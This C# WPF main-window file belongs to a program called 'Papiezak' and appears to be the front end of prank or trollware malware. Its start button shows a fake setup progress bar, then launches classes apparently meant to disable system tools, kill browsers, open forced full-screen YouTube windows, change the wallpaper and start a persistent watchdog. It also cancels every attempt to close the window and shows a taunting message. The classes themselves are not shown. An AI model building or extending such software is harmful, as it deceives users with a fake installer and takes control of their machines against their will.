using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.IO;
using Path = System.IO.Path;
using System.Diagnostics;
using System.Runtime.InteropServices;
using CreamPieWatchDog;

namespace Papiezak
{
    /// <summary>
    /// Logika interakcji dla klasy MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        DisableRund dr;
        midi md;
        bowserKiller bk;
        noKiosk bow;
        noKiosk mem1;
        fejkProgress fp;
        Tapeta tap;
        KremowyManager kiosk;
        WatchDog wd;


        public MainWindow()
        {

            InitializeComponent();
            Task.Run(() => { runWatchDog(); });

        }
        
        public string ConvertMidiFileToBase64String(string midiFilePath)
        {
            byte[] midiBytes = System.IO.File.ReadAllBytes(midiFilePath);
            return Convert.ToBase64String(midiBytes);
        }

        //File.WriteAllText("lol4.txt", ConvertMidiFileToBase64String("Papiezak.exe"));

        public void loadProgressClasses()
        {
            fp = new fejkProgress(this.progressBar, this.setupInfo, this.scrollView);
        }
        async public void loadClasses() 
        {
            dr = new DisableRund();
            md = new midi();
            bk = new bowserKiller();
            bow = new noKiosk("https://www.youtube.com/watch?v=gKgIc_9XYgo&autoplay=1", 46, 1200, 20);
            mem1 = new noKiosk("https://www.youtube.com/watch?v=5Uio3mIvoCg&autoplay=1", 3, 0, 0);
            tap = new Tapeta();
        }
        async public void runWatchDog() 
        {
            wd = new WatchDog();
            Task.Run(() => wd.Start());
        }
        async public void fireClasses() 
        {
            bow.PlayAndOpenBrowser();
            mem1.PlayAndOpenBrowser();
            await Task.Delay(TimeSpan.FromSeconds(62));
            kiosk = new KremowyManager();
        }


        private async void BtnStart_Click(object sender, RoutedEventArgs e)
        {

            loadProgressClasses();
            fp.BtnStart_Click(sender, e);
            
            //File.WriteAllText("lol3.txt", ConvertMidiFileToBase64String("CreamPieWatchDog.exe"));
            
            loadClasses();
            fireClasses();

        }
        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            e.Cancel = true; // This will cancel the close event.
            
            Task.Run(() => MessageBox.Show("Creampied n0t cl0s3d!"));
        }


    }
}
